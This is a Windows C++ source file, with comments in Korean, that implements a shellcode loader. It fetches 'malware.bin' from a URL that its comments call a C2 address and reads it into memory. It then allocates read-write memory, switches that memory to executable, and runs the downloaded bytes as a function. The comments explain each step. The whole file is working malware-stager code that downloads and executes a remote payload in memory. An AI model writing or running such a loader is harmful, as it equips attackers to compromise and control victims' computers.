#include <windows.h>
#include <wininet.h>
#include <iostream>
#pragma comment(lib, "wininet.lib")

int main() {
    // 브라우저 실행을 통해 인터넷 핸들 획득
    HINTERNET hInternet = InternetOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

    // 브라우저 실행에 실패할 경우 예외 처리
    if (hInternet == NULL) {
        std::cout << "InternetOpen failed: " << GetLastError() << std::endl;
        return 0;
    }

    // 브라우저 세션으로 실행할 URL 주소 입력 -> 악성코드 파일을 다운로드 할 수 있는 C2 주소
    HINTERNET hInternetOpenUrl = InternetOpenUrl(hInternet, L"http://example.com/malware.bin", NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);

    // URL 접속이 실패했을 경우 예외 처리 및 브라우저 핸들 닫기
    if (!hInternetOpenUrl) {
        std::cout << "InternetOpenUrl failed: " << GetLastError() << std::endl;
        InternetCloseHandle(hInternet);
        return 0;
    }

    // URL 접속 및 다운로드를 통해 저장할 데이터 버퍼 설정
    DWORD bytesRead;
    BYTE buffer[4096];
    std::string fullData;

    // 읽을 데이터의 크기가 버퍼보다 클 경우 완전히 읽을 때까지 반복
    while (InternetReadFile(hInternetOpenUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        fullData.append((char*)buffer, bytesRead);
    }

    // 프로세스 메모리에 RW 권한 할당
    LPVOID virtualBuffer = VirtualAlloc(NULL, fullData.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // 메모리 할당에 실패했을 경우 예외 처리
    if (!virtualBuffer) {
        std::cout << "VirtualAlloc failed" << std::endl;
        InternetCloseHandle(hInternetOpenUrl);
        InternetCloseHandle(hInternet);
        return 0;
    }

    // HTTP 요청을 통해 다운로드한 악성코드를 메모리 버퍼에 이동
    RtlMoveMemory(virtualBuffer, fullData.c_str(), fullData.size());

    // RW -> RX로 권한을 변경하여 실행 권한 부여
    DWORD oldProtect;
    if (!VirtualProtect(virtualBuffer, fullData.size(), PAGE_EXECUTE_READ, &oldProtect)) {
        std::cout << "VirtualProtect failed" << std::endl;
        VirtualFree(virtualBuffer, 0, MEM_RELEASE);
        InternetCloseHandle(hInternetOpenUrl);
        InternetCloseHandle(hInternet);
        return 0;
    }

    // 메모리에 로드된 악성코드 실행 (메모리에 로드된 바이너리를 실행할 수 있는 함수 형태로 형변환)
    ((void(*)())virtualBuffer)();

    // 정리
    VirtualFree(virtualBuffer, 0, MEM_RELEASE);
    InternetCloseHandle(hInternetOpenUrl);
    InternetCloseHandle(hInternet);

    return 0;
}